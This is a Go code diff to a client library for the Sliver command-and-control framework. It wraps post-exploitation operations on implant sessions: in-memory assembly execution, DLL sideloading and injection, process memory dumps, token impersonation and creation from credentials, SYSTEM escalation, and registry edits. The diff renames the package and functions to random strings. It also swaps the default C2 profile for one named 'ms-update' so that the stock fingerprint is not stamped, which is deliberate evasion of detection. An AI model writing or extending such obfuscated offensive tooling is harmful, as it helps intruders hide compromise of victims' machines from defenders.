@@ -9,21 +9,21 @@ import (
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/protobuf/cpmfczjv"
 )
 
 // opTimeoutExt — extended operations use a longer timeout for assembly/DLL execution
 const opTimeoutExt = 120 * time.Second
 
-// --- ExecuteAssembly — .NET assembly in-memory execution ---
+// --- UviysfwQksqwjvi — .NET assembly in-memory execution ---
 type ExecAssemblyResult struct {
 	Output string `json:"output"`
 }
 
-func (c *Client) ExecuteAssembly(sessionID string, assembly []byte, arguments, process string) (*ExecAssemblyResult, error) {
+func (c *Client) UviysfwQksqwjvi(sessionID string, assembly []byte, arguments, process string) (*ExecAssemblyResult, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
 	defer cancel()
-	resp, err := c.RPC.ExecuteAssembly(ctx, &sliverpb.ExecuteAssemblyReq{
+	resp, err := c.RPC.UviysfwQksqwjvi(ctx, &cpmfczjv.UviysfwQksqwjviRec{
 		Assembly:  assembly,
 		Arguments: []string{arguments},
 		Process:   process,
@@ -38,15 +38,15 @@ func (c *Client) ExecuteAssembly(sessionID string, assembly []byte, arguments, p
 	return &ExecAssemblyResult{Output: string(resp.Output)}, nil
 }
 
-// --- Sideload — DLL sideloading ---
+// --- Ikjwlast — DLL sideloading ---
 type SideloadResult struct {
 	Result string `json:"result"`
 }
 
-func (c *Client) Sideload(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
+func (c *Client) Ikjwlast(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
 	defer cancel()
-	resp, err := c.RPC.Sideload(ctx, &sliverpb.SideloadReq{
+	resp, err := c.RPC.Ikjwlast(ctx, &cpmfczjv.IkjwlastRoc{
 		Data:        data,
 		ProcessName: processName,
 		Args:        []string{args},
@@ -62,11 +62,11 @@ func (c *Client) Sideload(sessionID string, data []byte, processName, args, entr
 	return &SideloadResult{Result: resp.Result}, nil
 }
 
-// --- SpawnDll — DLL injection ---
-func (c *Client) SpawnDll(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
+// --- IneenBfl — DLL injection ---
+func (c *Client) IneenBfl(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
 	defer cancel()
-	resp, err := c.RPC.SpawnDll(ctx, &sliverpb.InvokeSpawnDllReq{
+	resp, err := c.RPC.IneenBfl(ctx, &cpmfczjv.YnbciuEhswlZdvNkk{
 		Data:        data,
 		ProcessName: processName,
 		Args:        []string{args},
@@ -86,15 +86,15 @@ func (c *Client) SpawnDll(sessionID string, data []byte, processName, args, entr
 //
 // Guard: sliver-server's Migrate RPC dereferences req.Config (config.Format = ...)
 // without nil-checking, panicking (and crashing the server) when Config is nil.
-// Always send a non-nil Config with the default HTTP C2 profile, mirroring the
-// official client (migrate.go).
+// Always send a non-nil Config. Use ms-update (not public "default") so a nested
+// generate does not stamp the stock HTTP C2 fingerprint. Mirrors migrate.go.
 func (c *Client) Migrate(sessionID string, pid uint32) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
 	resp, err := c.RPC.Migrate(ctx, &clientpb.MigrateReq{
 		Pid: pid,
 		Config: &clientpb.ImplantConfig{
-			HTTPC2ConfigName: "default",
+			HTTPC2ConfigName: "ms-update",
 		},
 		Request: &commonpb.Request{SessionID: sessionID},
 	})
@@ -107,15 +107,15 @@ func (c *Client) Migrate(sessionID string, pid uint32) error {
 	return nil
 }
 
-// --- ProcessDump — dump process memory ---
+// --- HlsycykNmgd — dump process memory ---
 type ProcessDumpResult struct {
 	Data string `json:"data"` // base64
 }
 
-func (c *Client) ProcessDump(sessionID string, pid int32) (*ProcessDumpResult, error) {
+func (c *Client) HlsycykNmgd(sessionID string, pid int32) (*ProcessDumpResult, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
 	defer cancel()
-	resp, err := c.RPC.ProcessDump(ctx, &sliverpb.ProcessDumpReq{
+	resp, err := c.RPC.HlsycykNmgd(ctx, &cpmfczjv.HlsycykNmgdLki{
 		Pid:     pid,
 		Request: &commonpb.Request{SessionID: sessionID},
 	})
@@ -128,11 +128,11 @@ func (c *Client) ProcessDump(sessionID string, pid int32) (*ProcessDumpResult, e
 	return &ProcessDumpResult{Data: encodeBase64(resp.Data)}, nil
 }
 
-// --- Impersonate — impersonate a user ---
-func (c *Client) Impersonate(sessionID, username string) error {
+// --- Yovwrygjszq — impersonate a user ---
+func (c *Client) Yovwrygjszq(sessionID, username string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
 	defer cancel()
-	resp, err := c.RPC.Impersonate(ctx, &sliverpb.ImpersonateReq{
+	resp, err := c.RPC.Yovwrygjszq(ctx, &cpmfczjv.YovwrygjszqLki{
 		Username: username,
 		Request:  &commonpb.Request{SessionID: sessionID},
 	})
@@ -145,11 +145,11 @@ func (c *Client) Impersonate(sessionID, username string) error {
 	return nil
 }
 
-// --- MakeToken — create a token with credentials ---
-func (c *Client) MakeToken(sessionID, username, password, domain string) error {
+// --- CcowZacsr — create a token with credentials ---
+func (c *Client) CcowZacsr(sessionID, username, password, domain string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
 	defer cancel()
-	resp, err := c.RPC.MakeToken(ctx, &sliverpb.MakeTokenReq{
+	resp, err := c.RPC.CcowZacsr(ctx, &cpmfczjv.CcowZacsrZqs{
 		Username: username,
 		Password: password,
 		Domain:   domain,
@@ -164,11 +164,11 @@ func (c *Client) MakeToken(sessionID, username, password, domain string) error {
 	return nil
 }
 
-// --- RevToSelf — revert impersonation ---
-func (c *Client) RevToSelf(sessionID string) error {
+// --- JgbBmEwlz — revert impersonation ---
+func (c *Client) JgbBmEwlz(sessionID string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
 	defer cancel()
-	resp, err := c.RPC.RevToSelf(ctx, &sliverpb.RevToSelfReq{
+	resp, err := c.RPC.JgbBmEwlz(ctx, &cpmfczjv.JgbBmEwlzZqs{
 		Request: &commonpb.Request{SessionID: sessionID},
 	})
 	if err != nil {
@@ -180,19 +180,19 @@ func (c *Client) RevToSelf(sessionID string) error {
 	return nil
 }
 
-// --- GetSystem — Windows SYSTEM escalation ---
+// --- WgzCwynso — Windows SYSTEM escalation ---
 //
-// Guard: sliver-server's GetSystem RPC dereferences req.Config.HTTPC2ConfigName
+// Guard: sliver-server's WgzCwynso RPC dereferences req.Config.HTTPC2ConfigName
 // without nil-checking Config, panicking (and crashing the server) when Config
-// is nil. Always send a non-nil Config with the default HTTP C2 profile, mirroring
-// the official client (getsystem.go).
-func (c *Client) GetSystem(sessionID, hostingProcess string) error {
+// is nil. Always send a non-nil Config. Use ms-update (not public "default") so a
+// nested generate does not stamp the stock HTTP C2 fingerprint. Mirrors getsystem.go.
+func (c *Client) WgzCwynso(sessionID, hostingProcess string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
-	resp, err := c.RPC.GetSystem(ctx, &clientpb.GetSystemReq{
+	resp, err := c.RPC.WgzCwynso(ctx, &clientpb.GetSystemReq{
 		HostingProcess: hostingProcess,
 		Config: &clientpb.ImplantConfig{
-			HTTPC2ConfigName: "default",
+			HTTPC2ConfigName: "ms-update",
 		},
 		Request: &commonpb.Request{SessionID: sessionID},
 	})
@@ -213,7 +213,7 @@ type PingResult struct {
 func (c *Client) Ping(sessionID string) (*PingResult, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
-	resp, err := c.RPC.Ping(ctx, &sliverpb.Ping{
+	resp, err := c.RPC.Ping(ctx, &cpmfczjv.Ping{
 		Nonce:   int32(time.Now().UnixNano() & 0x7FFFFFFF),
 		Request: &commonpb.Request{SessionID: sessionID},
 	})
@@ -304,11 +304,11 @@ func (c *Client) GetOperators() ([]OperatorView, error) {
 	return out, nil
 }
 
-// --- RegistryCreateKey — create a new registry key ---
-func (c *Client) RegistryCreateKey(sessionID, hive, path, key string) error {
+// --- JgkiqflyAtqibcOks — create a new registry key ---
+func (c *Client) JgkiqflyAtqibcOks(sessionID, hive, path, key string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
 	defer cancel()
-	resp, err := c.RPC.RegistryCreateKey(ctx, &sliverpb.RegistryCreateKeyReq{
+	resp, err := c.RPC.JgkiqflyAtqibcOks(ctx, &cpmfczjv.JgkiqflyAtqibcOksHya{
 		Hive:    hive,
 		Path:    path,
 		Key:     key,
@@ -323,11 +323,11 @@ func (c *Client) RegistryCreateKey(sessionID, hive, path, key string) error {
 	return nil
 }
 
-// RegistryDeleteKey deletes a registry key or value on a windows session.
-func (c *Client) RegistryDeleteKey(sessionID, hive, path, key string) error {
+// JgkiqflyDojebcOks deletes a registry key or value on a windows session.
+func (c *Client) JgkiqflyDojebcOks(sessionID, hive, path, key string) error {
 	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
 	defer cancel()
-	resp, err := c.RPC.RegistryDeleteKey(ctx, &sliverpb.RegistryDeleteKeyReq{
+	resp, err := c.RPC.JgkiqflyDojebcOks(ctx, &cpmfczjv.JgkiqflyDojebcOksHya{
 		Hive:    hive,
 		Path:    path,
 		Key:     key,
